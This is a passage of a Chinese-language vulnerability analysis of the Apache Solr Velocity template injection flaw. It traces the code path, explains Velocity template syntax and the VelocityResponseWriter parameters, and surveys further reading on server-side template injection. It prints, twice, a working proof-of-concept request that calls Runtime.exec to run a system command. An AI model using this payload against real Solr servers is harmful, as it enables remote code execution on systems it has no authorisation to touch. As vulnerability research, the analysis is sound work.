* * *
### POC后部分分析
  1. 笔者这里直接说几个关键的部分代码  
第一步先处理请求  
    1. `E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\lib\solr-core-8.2.0.jar!\org\apache\solr\servlet\SolrDispatchFilter.class`跳转到`E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\lib\solr-core-8.2.0.jar!\org\apache\solr\servlet\HttpSolrCall.class` 先处理参数wt，设置为velocity。  
    2. 写入响应  
    3. 判断方法，写查询响应，进一步查看内容。solrReuest就是我们的payload。  
    4. 跳转到velocityResponWriter.class,会创建velocity模板引擎。在到133行的位置进入模板方法  
    5. 在这里会跳转到SimpleNode.class类（我们熟悉的类），第一步会设置指引，接着会到ASTReference.class 在第八的位置，会遍历方法，会执行命令。  
    6. 在这里会跳转到ASTMethod类中，执行。  
    7. 具体执行是velocity模板引擎中有一个ClassMap类中。  
* * *
# 后记
## **知识补充**
在前面有涉及到JJTree、payload构造、JavaCC等知识，但笔者并没有详细的说明，笔者想先读者们简单了解一下这些知识，然后在说明一下简单做个简单说明。
## **#set语法**
#set语法可以创建一个Velocity的变量，#set语法对应的Velocity语法树是ASTSetDirective类，翻开这个类的代码，可以发现它有两个子节点：分别是RightHandSide和LeftHandSide，分别代表“=”两边的表达式值。与Java语言的赋值操作有点不一样的是，左边的LeftHandSide可能是一个变量标识符，也可能是一个set方法调用。变量标识符很好理解，如前面的#set($var=“偶数”)，另外是一个set方法调用，如#set(\$person.name=”junshan”)，这实际上相当于Java中person.setName(“junshan”)方法的调用。
## **#foreach语法**
Velocity中的循环语法只有这一种，它与Java中的for循环的语法糖形式十分类似，如#foreach($child in
$person.children)
$person.children表示的是一个集合，它可能是一个List集合或者一个数组，而$child表示的是每个从集合中取出的值。从render方法代码中可以看出，Velocity首先是取得$person.children的值，然后将这个值封装成Iterator集合，然后依次取出这个集合中的每一个值，将这个值以$child为变量标识符放入context中。除此以外需要特别注意的是，Velocity在循环时还在context中放入了另外两个变量，分别是counterName和hasNextName，这两个变量的名称分别在配置文件配置项directive.foreach.counter.name和directive.foreach.iterator.name中定义，它们表示当前的循环计数和是否还有下一个值。前者相当于for(int
i=1;i 的 JAR 文件的根中。 
  * params.resource.loader.enabled  
“params” 资源加载程序允许在 Solr 请求参数中指定模板。例如：
`http://localhost:8983/solr/gettingstarted/select?q=\*:*&wt=velocity&v.template=custom&v.template.custom=CUSTOM%3A%20%23core_name
v.template=custom`表示要呈现一个名为“自定义”的模板，其值`v.template.custom`是自定义模板。默认情况下为`false`；它不常用，需要时启用。
  * solr.resource.loader.enabled  
“solr” 资源加载程序是默认注册的唯一模板加载程序。模板是由 SolrResourceLoader
从velocity/子目录下可见的资源提供的。VelocityResponseWriter 本身有一些内置的模板（在它 JAR
文件中的velocity/），这些模板可以通过这个加载程序自动使用。当相同的模板名称处于 conf/velocity/
或使用template.base.dir选项时，可以覆盖这些内置模板。
* * *
**VelocityResponseWriter请求参数**
  * v.template  
指定要呈现的模板的名称。
  * v.layout  
指定一个模板名称，用作围绕主`v.template`指定模板的布局。  
主模板呈现为包含在布局渲染中的字符串值$content。
  * v.layout.enabled  
确定主模板是否应该有围绕它的布局。默认是`true`，但也需要指定`v.layout`。  
v.contentType  
指定 HTTP 响应中使用的内容类型。如果没有指定，默认取决于是否指定`v.json`。  
默认情况下不包含`v.json=wrf：text/html;charset=UTF-8`。  
默认为`v.json=wrf：application/json;charset=UTF-8`。
  * v.json  
指定一个函数名称来包装呈现为 JSON 的响应。如果指定，则响应中使用的内容类型将为“application / json; charset =
UTF-8”，除非被`v.contentType`覆盖。  
输出将采用以下格式（带`v.json=wrf`）：
        wrf("result":"")
  * v.locale  
使用`$resource`工具和其他 LocaleConfig
实现工具的语言环境。默认语言环境是`Locale.ROOT`。本地化资源从名为`resources[_locale-code].properties`的标准
Java 资源包中加载  
可以通过提供由 SolrResourceLoader 在速度子下的资源包可见的 JAR 文件来添加资源包。资源包不能在`conf/`下加载，因为只有
SolrResourceLoader 的类加载程序方面可以在这里使用。
  * v.template.template_name  
当启用 “params” 资源加载程序时，可以将模板指定为 Solr 请求的一部分。  
`params.resource.loader.enabled`  
“params” 资源加载程序允许在 Solr 请求参数中指定模板。例如：  
`http://localhost:8983/solr/gettingstarted/select?q=\*:*&wt=velocity&v.template=custom&v.template.custom=CUSTOM%3A%20%23core_name`
* * *
  1. 先将poc进行解码 
        http://127.0.0.1:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('calc')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
  2. set和foreach语法前面都介绍了，现在在看payload是不是就一目了然了？如何构造，为什么这么构造..
        #set($x='')  
    #set($rt=$x.class.forName('java.lang.Runtime'))
    #set($chr=$x.class.forName('java.lang.Character'))  
    #set($str=$x.class.forName('java.lang.String'))
    #set($ex=$rt.getRuntime().exec('calc'))$ex.waitFor() 
    #set($out=$ex.getInputStream())
    #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))
    #end
* * *
**附图：各框架模板结构：**
* * *
# 总结
## 漏洞总结
Apache Solr的`Config
API`是自带功能，用于通过HTTP请求更改配置；当Solr未设置访问鉴权时，可以直接通过ConfigAPI更改配置，为漏洞利用创造了前提。config
api是solr多此爆出漏洞关键[Apache Solr RCE](https://github.com/Imanfeng/Apache-Solr-RCE)有想法的童鞋可以看看这个项目。
## 题外话
之前刚刚爆出漏洞的时候，笔者还曾复现过，但奈何能力有限，不能深入理解其中内涵。深表惭愧，总的来说，努力学习，安全一行任重而道远。
* * *
# 推荐学习资料
想进行深入研究此漏洞肯定光看我这篇文章是不足的，毕竟我这这个只是Java方面上的，python、php等语言都没介绍。故此推荐，望彼有助。
**国内资料**
Python方面：[SSTI/沙盒逃逸详细总结](https://www.anquanke.com/post/id/188172)[flask之ssti模版注入从零到入门](https://xz.aliyun.com/t/3679)  
[Flask/Jinja2模板注入中的一些绕过姿势](https://p0sec.net/index.php/archives/120/)  
PHP方面：[服务端模板注入攻击 （SSTI）之浅析](https://www.freebuf.com/vuls/83999.html)
**国外资料**
这篇总结的比较全面：[Server-Side Template Injection: RCE for the modern
webapp](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)  
Python方面：[Jinja2 template injection filter
bypasses](https://0day.work/jinja2-template-injection-filter-bypasses/)
* * *
# 参考
[https://blog.csdn.net/sweety820/article/details/74347068?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task](https://blog.csdn.net/sweety820/article/details/74347068?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task)